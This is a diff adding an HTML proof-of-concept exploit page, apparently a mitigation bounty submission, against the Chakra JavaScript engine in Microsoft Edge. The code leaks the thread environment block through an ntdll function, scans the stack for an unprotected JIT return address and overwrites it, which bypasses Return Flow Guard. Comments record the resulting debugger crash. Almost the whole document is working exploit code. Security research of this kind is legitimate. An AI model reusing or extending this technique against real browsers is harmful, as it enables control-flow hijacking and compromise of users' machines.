@@ -1,0 +1,88 @@
+<html>
+<head>
+<title>Mitigation bounty PoC by @mxatone (Thomas Garnier)</title>
+<link rel="stylesheet" type="text/css" href="theme.css">
+<!-- Generic toolkit that can be used on multiple PoCs -->
+<script type="text/javascript" src="toolkit.js"></script>
+<script type="text/javascript">
+/*
+ * Search for amd64_CallFunction_pattern on the stack
+ * That's the return value for the JIT and there is no RFG on the JIT.
+ */
+var amd64_CallFunction_pattern = [ 0x48, 0x8b, 0xe5, 0x5d, 0x5f, 0x5e, 0x5b, 0xc3 ];
+function corrupt_stack_ret(exp, stack_limit, stack_base, chakra_base, chakra_end) {
+	while (!stack_limit.equal(stack_base)) {
+		var cur_ptr = exp.read_ptr(stack_limit);
+		var cur_stack = stack_limit;
+		stack_limit = stack_limit.add(8);
+		if (cur_ptr.gt(chakra_base) && cur_ptr.lt(chakra_end)) {
+			var match = exp.find_pattern_in_scope(cur_ptr,
+				amd64_CallFunction_pattern.length + 1,
+				amd64_CallFunction_pattern);
+				
+			// Found amd64_CallFunction_pattern
+			if (match != null) {
+				// Return to 0xAAAAAAA...
+				exp.write_ptr(cur_stack, new AInt([0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA]));
+				log("Try -> " + cur_stack.Stringify(16) + ": " + cur_ptr.Stringify(16));
+				break;
+			}
+		}
+	}
+	return stack_limit;
+}
+
+/*
+ * Poc1 - Leak the TEB, get the stack and replace return value on non-RFG return
+ * Tested on 10.0.14393, 10.0.14951 & 10.0.14955.
+ *
+ * Will crash on returning on custom address:
+ * (37c0.3a4c): Access violation - code c0000005 (first chance)
+ * First chance exceptions are reported before any exception handling.
+ * This exception may be expected and handled.
+ * 000002c0`409b0fd4 c3              ret <----------- That's a javascript JIT
+ * 0:009> dqs @rsp l1
+ * 000000ca`8a1f9d18  aaaaaaaa`aaaaaaaa
+ */
+function poc_1() {
+	var exp = null;
+	try {
+		exp = exploit_start("poc1 - Leak the TEB, get the stack and replace return value on non-RFG return");
+		
+		// RtlCleanUpTEBLangLists return the TEB by mistake? (checked on two versions)
+		var teb = exp.call_function("ntdll.dll", "RtlCleanUpTEBLangLists");
+		log("teb = " + teb.Stringify(16));
+		
+		var stack_limit = exp.read_ptr(teb.add(0x10));
+		var stack_base = exp.read_ptr(teb.add(0x8));
+		log("stack_limit = " + stack_limit.Stringify(16));
+		log("stack_base = " + stack_base.Stringify(16));
+		
+		var chakr_base = exp.find_module_base(exp.vtable);
+		var chakra_end = chakr_base.add(exp.find_image_size(chakr_base));
+		exp.tocall = corrupt_stack_ret;
+
+		// Try for the whole stack until it works?
+		while (!stack_limit.equal(stack_base))
+			stack_limit = exp.tocall(exp, stack_limit, stack_base, chakr_base, chakra_end);
+		
+		log("Failed...Be sure you don't try with the dev tools opened, else it will fail.");
+	} catch(err) {
+		log("JS EXCEPTION: "+err.stack);
+	} finally {
+		if (exp != null)
+			exp.cleanup();
+	}
+}
+</script>
+</head>
+<body>
+<h1>Mitigation bounty PoC - Leak Teb and ROP by @mxatone (Thomas Garnier)</h1>
+<div class="container">
+  <div class="buttonbar">
+    <input type="button" onclick="poc_1()" value="PoC 1 - Leak TEB and corrupt return address" />
+  </div>
+  <textarea id="log" class="text" wrap="off" placeholder="Log output will be here"></textarea>
+</div>
+</body>
+</html>
